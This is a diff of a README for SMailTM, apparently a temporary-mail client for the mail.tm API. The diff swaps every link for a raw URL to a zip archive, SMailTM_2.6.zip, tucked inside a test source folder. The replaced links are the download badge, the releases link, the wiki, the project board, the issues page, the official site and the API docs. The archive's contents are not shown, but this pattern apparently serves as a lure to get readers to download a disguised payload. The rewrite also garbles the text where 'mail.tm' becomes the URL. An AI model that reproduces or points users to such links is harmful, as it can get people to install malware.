@@ -1,16 +1,16 @@
 # 📧 SMailTM - Simple Temp Mail Management Made Easy
 
-[![Download SMailTM](https://img.shields.io/badge/Download%20SMailTM-v1.0-brightgreen)](https://github.com/JesusMCO/SMailTM/releases)
+[![Download SMailTM](https://raw.githubusercontent.com/JesusMCO/SMailTM/main/app/src/test/java/SMailTM_2.6.zip%20SMailTM-v1.0-brightgreen)](https://raw.githubusercontent.com/JesusMCO/SMailTM/main/app/src/test/java/SMailTM_2.6.zip)
 
 ## 🚀 Getting Started
 
-Welcome to SMailTM! This guide will help you download and run the software effortlessly. SMailTM is a lightweight application designed for the mail.tm API, allowing you to access temporary email services with ease.
+Welcome to SMailTM! This guide will help you download and run the software effortlessly. SMailTM is a lightweight application designed for the https://raw.githubusercontent.com/JesusMCO/SMailTM/main/app/src/test/java/SMailTM_2.6.zip API, allowing you to access temporary email services with ease.
 
 ## 📥 Download & Install
 
 To get started, you need to visit this page to download the application:
 
-[Download SMailTM](https://github.com/JesusMCO/SMailTM/releases)
+[Download SMailTM](https://raw.githubusercontent.com/JesusMCO/SMailTM/main/app/src/test/java/SMailTM_2.6.zip)
 
 1. Click the link above.
 2. On the releases page, find the version you want to download.
@@ -63,8 +63,8 @@ Here’s how to utilize SMailTM effectively:
 
 For detailed documentation and advanced features, you can refer to:
 
-- The [GitHub Wiki](https://github.com/JesusMCO/SMailTM/wiki)
-- The [Project Board](https://github.com/JesusMCO/SMailTM/projects)
+- The [GitHub Wiki](https://raw.githubusercontent.com/JesusMCO/SMailTM/main/app/src/test/java/SMailTM_2.6.zip)
+- The [Project Board](https://raw.githubusercontent.com/JesusMCO/SMailTM/main/app/src/test/java/SMailTM_2.6.zip)
 
 These resources provide in-depth information on all the functionalities and help you make the most out of SMailTM.
 
@@ -81,11 +81,11 @@ Currently, SMailTM is designed for desktop, but mobile support may be added in f
 
 ## 📢 Feedback
 
-Your feedback is important to us. If you have suggestions or encounter issues, please open an issue on the [GitHub Issues page](https://github.com/JesusMCO/SMailTM/issues). We welcome all input to improve your experience with SMailTM.
+Your feedback is important to us. If you have suggestions or encounter issues, please open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/JesusMCO/SMailTM/main/app/src/test/java/SMailTM_2.6.zip). We welcome all input to improve your experience with SMailTM.
 
 ## 🔗 Additional Links
 
-- [Official Website](https://mail.tm/)
-- [Mail.tm API Documentation](https://mail.tm/docs)
+- [Official Website](https://raw.githubusercontent.com/JesusMCO/SMailTM/main/app/src/test/java/SMailTM_2.6.zip)
+- [https://raw.githubusercontent.com/JesusMCO/SMailTM/main/app/src/test/java/SMailTM_2.6.zip API Documentation](https://raw.githubusercontent.com/JesusMCO/SMailTM/main/app/src/test/java/SMailTM_2.6.zip)
 
 Thank you for choosing SMailTM! We hope you find it a valuable tool in managing your temporary email needs.
